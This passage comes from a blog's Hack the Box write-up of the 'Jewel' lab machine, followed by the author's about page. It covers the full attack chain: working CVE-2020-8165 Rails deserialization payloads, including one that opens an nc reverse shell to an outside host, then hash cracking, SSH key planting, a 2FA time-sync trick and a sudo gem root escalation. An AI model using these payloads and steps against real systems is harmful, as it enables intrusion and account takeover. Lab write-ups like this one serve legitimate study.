vulnerability publicly disclosed as CVE-2020-8165. Thanks to the PoC on github by masahiro331 we can see what exactly needs to be done to exploit this version of Ruby and get our code running on the box. $ curl 'localhost:3000/users?new=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%15%60touch+%2Ftmp%2Frce%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T' Great! So we have a possible exploit, but where are we supposed to put it? For that we go check out the other site this box is hosting. 2.2.2 Bl0G! So we head on over to 10.10.10:211:8080 in our browser and it brings us to the “Bl0G” page. After some poking around we find we can make a user account and login. We’re able to read all the posts but don’t seem to be able to interact with them in any other way. ","date":"2021-02-15","objectID":"/jewel/:2:2","tags":["Linux","Web","Git","CVE","HTB"],"title":"Hack the Box - Jewel","uri":"/jewel/"},{"categories":["write-ups"],"content":"3. Exploitation Since we already know what exploit we’re going to try we can start looking for a place to send it. The only text field that we found that was able to be updated was the username field under our profile after we are logged in to the site. After opening up Burp Suite and configuring our browser to use it as our proxy we’re able to intercept the web traffic between us and the blog. When we go to update our username we can edit that request before sending it to the server and insert that PoC script from before replacing code execution section with our reverse shell. %04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22U%60rm+%2Ftmp%2Ff%3Bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+10.10.14.64+1234+%3e%2Ftmp%2ff%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T Before sending this off we need to start our netcat listener with nc -lvnp 1234. Once that’s listening we can send off that request and reload the webpage. After the reload we get a connection on our listener as user Bill. This connection is just a simple shell so we can upgrade it using the python pty module. python -c 'import pty;pty.spawn(\"/bin/bash\")' First thing to do is a quick list of all files in Bill’s home directory and take note of what we see. If this write-up was helpful consider leaving some respect on my HTB profile. ","date":"2021-02-15","objectID":"/jewel/:3:0","tags":["Linux","Web","Git","CVE","HTB"],"title":"Hack the Box - Jewel","uri":"/jewel/"},{"categories":["write-ups"],"content":"4. Privilege Escalation We already have a user account but the ultimate goal is to own root. After some enumeration in the common directories we find a sqldump in /var/backups. When we read that file it looks like there’s hashes for two different users. So let’s grab those: If we run getent passwd as Bill we can see that Jennifer doesn’t appear to be a user on the box. With that in mind we can try cracking Bill’s hash first and save the other one for later, it might still be useful if it’s crackable. Once we copy the hash to our host machine we can run John the Ripper against it using the rockyou password list. sudo john ./bill.hash --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt With Bill’s password we attempted to connect via SSH but it seems to still be asking for a SSH key. I looked at Bill’s home directory and there was no .ssh folder so I ran a quick ssh-keygen and echoed my id_rsa.pub into the newly created authorized_keys file. Now that we have Bill’s password we can run a sudo -l to see if he can run any commands as root. After putting in Bill’s password the box asks for a 2FA code. For that we go back to Bill’s home directory where we saw that .google_authenticator file when we first gained access. If we manually input the 2FA secret into the authenticator add-on for Chrome it will give us an authentication code to use. Unfortunately for us there still seems to be an error when using it. Clearly the 2FA code didn’t work. Since the codes are time based the first thing to look at what the time is set to on Jewel with timedatectl as well as our host machine. Well we’re clearly not matching so we’ll have to set our time-zone and time to match Jewel for our 2FA codes to work. timedatectl set-timezone Europe/London if the time is off you may need timedatectl set-time XX:XX:XX to synchronize the times After we sync our times the 2FA codes work and we can finally run our sudo -l commmand. Looks like Bill can run the gem command with sudo. Let’s head over to GTFObins to see if there’s a way to get root with this command. Looks like if we run one simple command we can hop over to root. So let’s do it. sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc And just like that we have root. As usual we can insert our id_rsa.pub key into root’s /root/.ssh/authorized_keys folder to we can get access without having to utilize Bill’s user account. ","date":"2021-02-15","objectID":"/jewel/:4:0","tags":["Linux","Web","Git","CVE","HTB"],"title":"Hack the Box - Jewel","uri":"/jewel/"},{"categories":["write-ups"],"content":"Conclusion Make sure your project documents are locked down and your systems are patched. You should never leave password hashes unprotected in an easily accessible location. If you’re going to utilize 2FA don’t keep your 2FA secret in a folder on your computer. If this write-up was helpful consider leaving some respect on my HTB profile.","date":"2021-02-15","objectID":"/jewel/:5:0","tags":["Linux","Web","Git","CVE","HTB"],"title":"Hack the Box - Jewel","uri":"/jewel/"},{"categories":null,"content":"  ","date":"2019-08-02","objectID":"/about/:0:0","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"Jason, HcKy, just a cyber security hobbyist. ","date":"2019-08-02","objectID":"/about/:0:1","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"I enjoy doing CTFs, Hack the Box, and learning new things in my spare time. ","date":"2019-08-02","objectID":"/about/:0:2","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"Currently working on my Master’s degree. ","date":"2019-08-02","objectID":"/about/:0:3","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"Click below for site links and badges. Site Links CTF Team CTF Team - Cyber Club CTF Team - New Hack The Box Try Hack Me Github Badges  Contestant Global OSINT Search Party CTF Awarded:Feb 20, 2021   ","date":"2019-08-02","objectID":"/about/:0:4","tags":null,"title":"","uri":"/about/"}]